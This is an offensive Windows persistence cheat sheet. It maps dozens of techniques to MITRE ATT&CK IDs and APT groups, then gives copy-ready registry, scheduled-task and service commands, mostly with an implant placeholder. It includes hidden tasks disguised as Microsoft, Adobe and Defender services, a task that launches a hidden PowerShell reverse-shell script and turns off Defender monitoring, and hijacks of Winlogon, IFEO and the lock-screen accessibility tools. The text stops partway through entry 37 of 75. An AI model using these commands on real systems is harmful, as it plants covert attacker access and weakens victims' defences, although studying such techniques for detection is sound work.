# Windows Persistence, Privilege Escalation & Post-Exploitation — Full Reference
> **Author:** m.manikandan
> **Location:** Kumbakonam, Tamil Nadu
> **Channel:** Hacker Tamizha
> All payload paths replaced with `{path}` — swap in your implant before use.
> For educational & lab use only.

---

## Quick Index — Persistence Techniques

| # | Technique | Admin | MITRE TTP | ATT&CK ID |
|---|-----------|:-----:|-----------|-----------|
| 1 | Startup Folder — EXE Copy | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 2 | Startup Folder — LNK Shortcut | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 3 | All Users Startup | ✅ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 4 | Scheduled Task (schtasks basic) | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
| 5 | Scheduled Task XML — Single Action | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
| 6 | Scheduled Task XML — Multi Action | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
| 7 | At.exe Legacy Scheduler | ❌ | Scheduled Task/Job: At | T1053.002 |
| 8 | Registry Run Key | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 9 | Explorer Policy Run Key | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 10 | Explorer Load Key | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 11 | CMD AutoRun | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 12 | Environment Variable | ❌ | Modify Registry | T1112 |
| 13 | Logon Script (UserInitMprLogonScript) | ❌ | Boot or Logon Init Scripts: Logon Script (Win) | T1037.001 |
| 14 | Logon BAT Script | ❌ | Boot or Logon Init Scripts: Logon Script (Win) | T1037.001 |
| 15 | StartupApproved Bypass | ❌ | Boot or Logon Autostart: Startup Folder | T1547.001 |
| 16 | IFEO Debugger Hijack | ✅ | Event Triggered: IFEO Injection | T1546.012 |
| 17 | SilentProcessExit | ✅ | Event Triggered: IFEO Injection | T1546.012 |
| 18 | Userinit Hijack | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 19 | Shell Hijack (Winlogon) | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 20 | Winlogon MPNotify | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 21 | Active Setup | ✅ | Boot or Logon Autostart: Active Setup | T1547.014 |
| 22 | Boot Execute | ✅ | Pre-OS Boot: Bootkit (Session Manager) | T1542.003 |
| 23 | Terminal Server Initial Program (RDP) | ✅ | Remote Services: Remote Desktop Protocol | T1021.001 |
| 24 | Accessibility Hijack (sethc / utilman) | ✅ | Event Triggered: Accessibility Features | T1546.008 |
| 25 | Screensaver (SCRNSAVE.EXE) | ❌ | Event Triggered: Screensaver | T1546.002 |
| 26 | Screensaver Path Hijack | ❌ | Event Triggered: Screensaver | T1546.002 |
| 27 | Shell Open Command Hijack (.txt) | ❌ | Event Triggered: Change Default File Association | T1546.001 |
| 28 | PATH Hijack | ❌ | Hijack Execution Flow: Path Interception | T1574.007 |
| 29 | Shortcut Hijack | ❌ | Boot or Logon Autostart: Shortcut Modification | T1547.009 |
| 30 | Recycle Bin Persistence | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 31 | PowerShell Profile | ❌ | Event Triggered: PowerShell Profile | T1546.013 |
| 32 | New Service | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
| 33 | Modify Existing Service | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
| 34 | Service Failure Recovery | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
| 35 | BITS Job Persistence | ❌ | BITS Jobs | T1197 |
| 36 | Disk Cleanup COM Handler | ❌ | Event Triggered: Component Object Model Hijacking | T1546.015 |
| 37 | Windows Error Reporting (AeDebug) | ✅ | Event Triggered: IFEO Injection | T1546.012 |
| 38 | Application Shim (AppCompat) | ✅ | Event Triggered: Application Shimming | T1546.011 |
| 39 | WMI Event Subscription | ✅ | Event Triggered: WMI Event Subscription | T1546.003 |
| 40 | Hidden User Account | ✅ | Create Account: Local Account | T1136.001 |
| 41 | fodhelper UAC Bypass | ❌ | Abuse Elevation Control: Bypass UAC | T1548.002 |
| 42 | WSL Persistence | ❌ | Command & Scripting Interpreter: Unix Shell | T1059.004 |
| 43 | DPAPI CurrentUser Registry | ❌ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
| 44 | DPAPI Machine Scope | ✅ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
| 45 | AES Encrypted Registry Loader | ❌ | Obfuscated Files: Encrypted/Encoded File | T1027.013 |
| 46 | XOR Obfuscated + DPAPI + RunKey | ❌ | Obfuscated Files + Registry Run Keys | T1027 + T1547.001 |
| **— DLL-BASED —** | | | | |
| 47 | AppInit_DLLs | ✅ | Event Triggered: AppInit DLLs | T1546.010 |
| 48 | COM DLL Hijack (HKCU Override) | ❌ | Event Triggered: COM Object Hijacking | T1546.015 |
| 49 | Service DLL — svchost.exe | ✅ | Create or Modify System Process: Windows Service | T1543.003 |
| 50 | Winlogon Notification Package DLL | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 51 | LSA Security Support Provider (SSP) DLL | ✅ | Boot or Logon Autostart: Security Support Provider | T1547.005 |
| 52 | rundll32 + RunKey (Reflective DLL) | ❌ | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| 53 | Scheduled Task — rundll32 DLL | ❌ | Scheduled Task/Job: Scheduled Task | T1053.005 |
| 54 | Phantom DLL Hijack | ❌ | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 |
| 55 | .NET Profiler DLL (COR_PROFILER) | ❌ | Hijack Execution Flow: COR_PROFILER | T1574.012 |
| 56 | ETW Provider Hijack DLL | ✅ | Hijack Execution Flow | T1574 |
| 57 | AMSI Provider DLL | ✅ | Impair Defenses: Disable or Modify Tools | T1562.001 |
| 58 | Print Processor DLL | ✅ | Boot or Logon Autostart: Print Processors | T1547.012 |
| 59 | Winsock LSP DLL | ❌ | Hijack Execution Flow | T1574 |
| 60 | netsh Helper DLL | ✅ | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 |
| 61 | WMI Provider DLL | ✅ | Event Triggered: WMI Event Subscription | T1546.003 |
| 62 | Network Provider DLL | ✅ | Modify Authentication Process: Network Provider DLL | T1556.008 |
| 63 | Password Filter DLL (SAM) | ✅ | Modify Authentication Process: Password Filter DLL | T1556.002 |
| 64 | WinRT DLL Activation (HKCU) | ❌ | Hijack Execution Flow: DLL Side-Loading | T1574.002 |
| 65 | Credential Provider DLL | ✅ | Boot or Logon Autostart: Winlogon Helper DLL | T1547.004 |
| 66 | Shell Extension DLL (Context Menu) | ❌ | Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 |
| 67 | DiagTrack DLL Hijack | ❌ | Hijack Execution Flow: DLL Side-Loading | T1574.002 |

---

## Quick Index — Privilege Escalation Techniques

| # | Technique | Admin | MITRE TTP | ATT&CK ID |
|---|-----------|:-----:|-----------|-----------|
| 68 | Unquoted Service Path | ❌ | Hijack Execution Flow: Unquoted Path | T1574.009 |
| 69 | Weak Service Binary Permissions | ❌ | Hijack Execution Flow: Services File Permission Weakness | T1574.010 |
| 70 | Weak Service Registry Permissions | ❌ | Hijack Execution Flow | T1574 |
| 71 | AlwaysInstallElevated (MSI) | ❌ | Abuse Elevation Control | T1548 |
| 72 | Token Impersonation (PrintSpoofer / GodPotato) | ❌→✅ | Access Token Manipulation | T1134 |
| 73 | DLL Hijack in SYSTEM Service | ❌ | DLL Search Order Hijacking | T1574.001 |
| 74 | SeImpersonatePrivilege Abuse | ❌→✅ | Access Token Manipulation: Token Impersonation | T1134.001 |
| 75 | Stored Credential Abuse (cmdkey) | ❌ | Credentials from Password Stores | T1555 |

---

## Known APT Groups by Technique

| Technique / TTP | Known APT Groups |
|-----------------|-----------------|
| Startup Folder (T1547.001) | APT29 (Cozy Bear), APT32 (OceanLotus), Lazarus Group, FIN7 |
| Registry Run Keys (T1547.001) | APT28 (Fancy Bear), Turla, Kimsuky, Carbanak |
| Scheduled Task (T1053.005) | APT41, Lazarus Group, FIN6, Cobalt Group |
| Logon Script (T1037.001) | APT3, APT29 |
| IFEO Debugger Hijack (T1546.012) | Turla, APT3 |
| Winlogon Helper DLL (T1547.004) | APT28, Turla, PLATINUM |
| Active Setup (T1547.014) | APT29 |
| Accessibility Hijack (T1546.008) | APT3, APT28, CyberArk |
| Screensaver (T1546.002) | APT28, OilRig |
| Shell Open Command Hijack (T1546.001) | Patchwork, Turla |
| Path Interception (T1574.007) | APT41, PowerGhost |
| PowerShell Profile (T1546.013) | APT29, Turla |
| Windows Service (T1543.003) | APT28, Lazarus Group, FIN7, Carbanak |
| BITS Jobs (T1197) | APT41, APT28, FIN7, BRONZE BUTLER |
| COM Hijacking (T1546.015) | APT28, Turla, BRONZE BUTLER |
| Application Shimming (T1546.011) | CarbonSpider, FIN7 |
| WMI Event Subscription (T1546.003) | APT29, APT33, Lazarus Group, Turla |
| Create Account (T1136.001) | APT33, OilRig, Lazarus Group |
| UAC Bypass (T1548.002) | APT29, APT41, Turla |
| Obfuscation (T1027) | APT28, APT29, Lazarus Group, APT41 |
| AppInit DLLs (T1546.010) | Turla, APT29 |
| Security Support Provider (T1547.005) | Turla, APT28, PLATINUM |
| DLL Search Order Hijacking (T1574.001) | APT41, Lazarus Group, Turla |
| COR_PROFILER (T1574.012) | Lazarus Group, Turla |
| Print Processors (T1547.012) | Lazarus Group, APT28 |
| Network Provider DLL (T1556.008) | APT28, Lazarus Group |
| Password Filter DLL (T1556.002) | APT28, Lazarus Group |
| DLL Side-Loading (T1574.002) | APT41, Lazarus Group, APT29 |

---

## 1. Startup Folder — EXE Copy
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT29, APT32, Lazarus Group, FIN7

Windows Startup = Auto-run list when PC turns ON. Any program placed there launches automatically — no manual open needed.

```powershell
copy {path} "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

dir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
Get-CimInstance Win32_StartupCommand | Select Name, Command, Location, User
wmic startup get caption,command

# Cleanup
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{filename}"
```

**Quick access:** `Win+R` → `shell:startup`

---

## 2. Startup Folder — LNK Shortcut
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT29, Lazarus Group

```powershell
$WS = New-Object -ComObject WScript.Shell
$SC = $WS.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upd.lnk")
$SC.TargetPath = "{path}"
$SC.Save()

# Cleanup
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upd.lnk"
```

---

## 3. All Users Startup
**TTP:** T1547.001 | **Admin:** ✅ | **APT:** APT29, FIN7

```powershell
copy "{path}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

**Quick access:** `Win+R` → `shell:common startup`

---

## 4. Scheduled Task (schtasks — Basic)
**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Lazarus Group, FIN6

```powershell
schtasks /create /tn "DemoTasks\OpenCalc" /sc daily /st 10:00 /tr "{path}"
schtasks /query /fo LIST /V
schtasks /query /tn "DemoTasks\OpenCalc" /fo LIST /v

Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Format-Table TaskName, TaskPath, State
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}

# Cleanup
schtasks /delete /tn "DemoTasks\OpenCalc" /f
```

---

## 5. Scheduled Task XML — Single Action
**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Lazarus Group

```powershell
@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Adobe Flash Sync Service</Description>
    <URI>\AdobeFlashSync</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$env:COMPUTERNAME\$env:USERNAME</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec><Command>{path}</Command></Exec>
  </Actions>
</Task>
"@ | Out-File "task.xml" -Encoding Unicode

schtasks /create /tn "AdobeFlashSync" /xml "task.xml" /f
schtasks /query /tn "AdobeFlashSync" /fo LIST /v
schtasks /run /tn "AdobeFlashSync"

# Cleanup
schtasks /delete /tn "AdobeFlashSync" /f
```

**XML task files location:** `C:\Windows\System32\Tasks\`

---

## 6. Scheduled Task XML — Multi Action
**TTP:** T1053.005 | **Admin:** ❌ | **APT:** APT41, Cobalt Group

Multi-action task: runs implant, PS reverse shell, copies to Startup, adds Run key, disables Defender.

```powershell
@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Defender Sync Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <CalendarTrigger>
      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2026-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Settings><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions Context="Author">
    <Exec><Command>{path}</Command></Exec>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\path\to\shell.ps1</Arguments>
    </Exec>
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c copy {path} "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost32.exe"</Arguments>
    </Exec>
    <Exec>
      <Command>reg.exe</Command>
      <Arguments>add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinDefSync" /t REG_SZ /d "{path}" /f</Arguments>
    </Exec>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"</Arguments>
    </Exec>
  </Actions>
</Task>
"@ | Out-File "multitask.xml" -Encoding Unicode

schtasks /create /tn "WindowsDefenderSync" /xml "multitask.xml" /f
schtasks /run /tn "WindowsDefenderSync"

# Cleanup
schtasks /delete /tn "WindowsDefenderSync" /f
```

---

## 7. At.exe Legacy Scheduler
**TTP:** T1053.002 | **Admin:** ❌ | **APT:** APT28, older threat actors

```powershell
at 10:00 /every:M,T,W,Th,F "{path}"
at
at /delete /yes
```

---

## 8. Registry Run Key
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT28, Turla, Kimsuky, Carbanak

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate

# Machine-wide (admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f

# Cleanup
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /f
```

---

## 9. Explorer Policy Run Key
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** APT28, Turla

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "MSUpdate" /t REG_SZ /d "{path}" /f
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v MSUpdate /f
```

---

## 10. Explorer Load Key
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** Turla, BRONZE BUTLER

```powershell
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /t REG_SZ /d "{path}" /f
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /f
```

---

## 11. CMD AutoRun
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** Turla, FIN7

```powershell
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "{path}" /f
reg query "HKCU\Software\Microsoft\Command Processor" /v AutoRun

# Cleanup
reg delete "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f
```

---

## 12. Environment Variable
**TTP:** T1112 | **Admin:** ❌ | **APT:** OilRig, APT28

```powershell
reg add "HKEY_CURRENT_USER\Environment" /v DemoApp /t REG_SZ /d "{path}" /f

# Cleanup
REG DELETE "HKEY_CURRENT_USER\Environment" /v DemoApp /f
```

---

## 13. Logon Script (UserInitMprLogonScript)
**TTP:** T1037.001 | **Admin:** ❌ | **APT:** APT3, APT29, Lazarus Group

```powershell
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "{path}" /f
reg query "HKCU\Environment" /v UserInitMprLogonScript

# Cleanup
reg delete "HKCU\Environment" /v UserInitMprLogonScript /f
```

---

## 14. Logon BAT Script
**TTP:** T1037.001 | **Admin:** ❌ | **APT:** APT3, Kimsuky

```powershell
echo {path} > C:\ProgramData\logon.bat
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\ProgramData\logon.bat" /f

# Cleanup
reg delete "HKCU\Environment" /v UserInitMprLogonScript /f
del C:\ProgramData\logon.bat
```

---

## 15. StartupApproved Bypass
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** FIN7

```powershell
copy "{path}" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

$val = [byte[]](0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" `
    -Name "update.exe" -Value $val -Type Binary

# Cleanup
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder" -Name "update.exe"
```

---

## 16. IFEO Debugger Hijack
**TTP:** T1546.012 | **Admin:** ✅ | **APT:** Turla, APT3, PLATINUM

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "{path}" /f
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /f
```

---

## 17. SilentProcessExit
**TTP:** T1546.012 | **Admin:** ✅ | **APT:** Turla, APT3

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "{path}" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /f
```

---

## 18. Userinit Hijack
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla, PLATINUM

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,{path}" /f
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit

# Restore
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
```

---

## 19. Shell Hijack (Winlogon)
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, Turla

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,{path}" /f

# Restore
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
```

---

## 20. Winlogon MPNotify
**TTP:** T1547.004 | **Admin:** ✅ | **APT:** APT28, PLATINUM

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify /t REG_SZ /d "{path}" /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v mpnotify /f
```

---

## 21. Active Setup
**TTP:** T1547.014 | **Admin:** ✅ | **APT:** APT29

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /v StubPath /t REG_SZ /d "{path}" /f
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /v Version /t REG_SZ /d "1,0,0,0" /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EVIL001}" /f
```

---

## 22. Boot Execute
**TTP:** T1542.003 | **Admin:** ✅ | **APT:** Advanced nation-state actors

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0{path}" /f

# Restore
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *" /f
```

---

## 23. Terminal Server Initial Program (RDP)
**TTP:** T1021.001 | **Admin:** ✅ | **APT:** APT33, OilRig, Lazarus Group

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /t REG_SZ /d "{path}" /f

# Cleanup
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v InitialProgram /f
```

---

## 24. Accessibility Hijack (sethc / utilman)
**TTP:** T1546.008 | **Admin:** ✅ | **APT:** APT3, APT28, CyberArk

```powershell
# sethc.exe = Shift x5 on lock screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "{path}" /f

# utilman.exe = Win+U on lock screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "{path}" /f

# Cleanup
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
```

---

## 25. Screensaver (SCRNSAVE.EXE)
**TTP:** T1546.002 | **Admin:** ❌ | **APT:** APT28, OilRig

```powershell
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "{path}" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f

# Restore
reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "" /f
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "900" /f
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "0" /f
```

---

## 26. Screensaver Path Hijack
**TTP:** T1546.002 | **Admin:** ❌ | **APT:** APT28, OilRig

```powershell
copy "{path}" "%APPDATA%\scrnsave.scr"
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%APPDATA%\scrnsave.scr" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "10" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f

# Cleanup
reg delete "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /f
del "%APPDATA%\scrnsave.scr"
```

---

## 27. Shell Open Command Hijack (.txt)
**TTP:** T1546.001 | **Admin:** ❌ | **APT:** Patchwork, Turla

```powershell
reg add "HKCU\Software\Classes\txtfile\shell\open\command" /ve /t REG_SZ /d "{path} %1" /f

# Cleanup
reg delete "HKCU\Software\Classes\txtfile" /f
```

---

## 28. PATH Hijack
**TTP:** T1574.007 | **Admin:** ❌ | **APT:** APT41, PowerGhost

```powershell
$env:PATH -split ";"

copy "{path}" "$env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe"
copy "{path}" "$env:LOCALAPPDATA\Microsoft\WindowsApps\git.exe"
copy "{path}" "$env:LOCALAPPDATA\Microsoft\WindowsApps\node.exe"

where.exe python

# Cleanup
del "$env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe"
```

---

## 29. Shortcut Hijack
**TTP:** T1547.009 | **Admin:** ❌ | **APT:** Turla, APT32

```powershell
$path = "$env:USERPROFILE\Desktop\Google Chrome.lnk"
$WS = New-Object -ComObject WScript.Shell
$SC = $WS.CreateShortcut($path)
$SC.TargetPath = "{path}"
$SC.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$SC.Save()

# Restore
$SC.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$SC.Save()
```

---

## 30. Recycle Bin Persistence
**TTP:** T1547.001 | **Admin:** ❌ | **APT:** Custom/Red Team

```powershell
$sid = (whoami /user | Select-String "S-1-").ToString().Trim().Split()[-1]
$recyclePath = "C:\`$Recycle.Bin\$sid"
copy "{path}" "$recyclePath\winlogon.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Recycle" /t REG_SZ /d "$recyclePath\winlogon.exe" /f

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Recycle" /f
del "$recyclePath\winlogon.exe"
```

---

## 31. PowerShell Profile
**TTP:** T1546.013 | **Admin:** ❌ | **APT:** APT29, Turla

```powershell
New-Item -ItemType Directory -Path "$HOME\Documents\WindowsPowerShell" -Force
echo "{path}" > "$HOME\Documents\WindowsPowerShell\profile.ps1"

# Cleanup
del $HOME\Documents\WindowsPowerShell\profile.ps1
```

---

## 32. New Service
**TTP:** T1543.003 | **Admin:** ✅ | **APT:** APT28, Lazarus Group, FIN7, Carbanak

```powershell
sc.exe create UpdateService binPath= "{path}" start= auto
sc.exe query UpdateService
sc.exe start UpdateService

# Cleanup
sc.exe delete UpdateService
```

---

## 33. Modify Existing Service
**TTP:** T1543.003 | **Admin:** ✅ | **APT:** APT28, Carbanak

```powershell
sc config UpdateService binpath= "{path}"
sc stop UpdateService
sc start UpdateService
sc qc UpdateService
```

---

## 34. Service Failure Recovery
**TTP:** T1543.003 | **Admin:** ✅ | **APT:** Custom/Red Team

```powershell
sc create FakeSvc binPath= "C:\Windows\System32\svchost.exe" start= auto
sc failure FakeSvc reset= 0 actions= run/0
sc failureflag FakeSvc 1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FakeSvc\Parameters" /v FailureCommand /t REG_SZ /d "{path}" /f
sc stop FakeSvc

# Cleanup
sc delete FakeSvc
```

---

## 35. BITS Job Persistence
**TTP:** T1197 | **Admin:** ❌ | **APT:** APT41, APT28, FIN7, BRONZE BUTLER

```powershell
bitsadmin /create /download PersistJob
bitsadmin /addnotifycmdline PersistJob "{path}" ""
bitsadmin /SetNotifyFlags PersistJob 1
bitsadmin /resume PersistJob

bitsadmin /list /allusers /verbose

# Cleanup
bitsadmin /cancel PersistJob
```

---

## 36. Disk Cleanup COM Handler
**TTP:** T1546.015 | **Admin:** ❌ | **APT:** APT28, Turla, BRONZE BUTLER

```powershell
reg add "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}\InprocServer32" /ve /t REG_SZ /d "{path}" /f
reg add "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
cleanmgr.exe

# Cleanup
reg delete "HKCU\Software\Classes\CLSID\{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}" /f
```

---

## 37. Windows Error Reporting (AeDebug)
**TTP:** T1546.012 | **Admin:** ✅ | **APT:** Nation-state actors

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /t REG_SZ /d "{path} %ld %ld" /f
